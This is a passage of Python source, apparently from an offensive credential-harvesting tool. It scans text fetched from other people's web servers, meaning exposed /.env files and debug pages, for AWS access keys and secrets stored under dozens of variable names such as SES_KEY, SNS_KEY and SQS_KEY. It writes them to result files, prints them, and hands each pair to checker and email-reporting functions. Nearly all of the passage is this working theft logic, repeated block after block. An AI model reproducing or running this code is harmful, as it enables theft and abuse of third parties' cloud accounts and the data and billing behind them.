						aws_sec = reg("<td>AWS_CLOUD_WATCH_KEY_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "OC_ACCESS_KEY_ID" in str(text):
				if "OC_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nOC_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nOC_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>OC_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>OC_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>OC_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_QUEUE_KEY" in str(text):
				if "AWS_QUEUE_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_QUEUE_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_QUEUE_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_QUEUE_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_QUEUE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_QUEUE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID" in str(text):
				if "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nDYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nDYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>DYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "# SES_KEY" in str(text):
				if "# SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n# SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n# SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td># SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td># SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td># SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#SES_KEY" in str(text):
				if "#SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SNS_KEY" in str(text):
				if "SNS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AMAZON_SNS_ACCESS_KEY" in str(text):
				if "AMAZON_SNS_ACCESS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAMAZON_SNS_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAMAZON_SNS_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AMAZON_SNS_ACCESS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AMAZON_SNS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AMAZON_SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "S3_AUDIO_ACCESS_KEY" in str(text):
				if "S3_AUDIO_ACCESS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nS3_AUDIO_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nS3_AUDIO_ACCESS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>S3_AUDIO_ACCESS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>S3_AUDIO_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>S3_AUDIO_ACCESS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "CLOUDWATCH_LOG_KEY" in str(text):
				if "CLOUDWATCH_LOG_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nCLOUDWATCH_LOG_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nCLOUDWATCH_LOG_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>CLOUDWATCH_LOG_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>CLOUDWATCH_LOG_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>CLOUDWATCH_LOG_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SNS_ID" in str(text):
				if "SNS_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSNS_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSNS_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SNS_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SNS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#AWS_ACCESS_KEY_ID" in str(text):
				if "#AWS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#AWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#AWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_ACCESS_KEY_ID_SNAPSHOT" in str(text):
				if "AWS_ACCESS_KEY_ID_SNAPSHOT=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_ACCESS_KEY_ID_SNAPSHOT=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_SNAPSHOT=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_SNAPSHOT</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_SNAPSHOT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "# AWS_KEY" in str(text):
				if "# AWS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n# AWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n# AWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td># AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td># AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td># AWS_SECRE<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SQS_KEY" in str(text):
				if "SQS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSQS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSQS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SQS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SQS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SQS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWSOWL_ACCESS_KEY_ID" in str(text):
				if "AWSOWL_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWSOWL_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWSOWL_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWSOWL_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWSOWL_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWSOWL_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "WAS_ACCESS_KEY_ID" in str(text):
				if "WAS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nWAS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nWAS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>WAS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
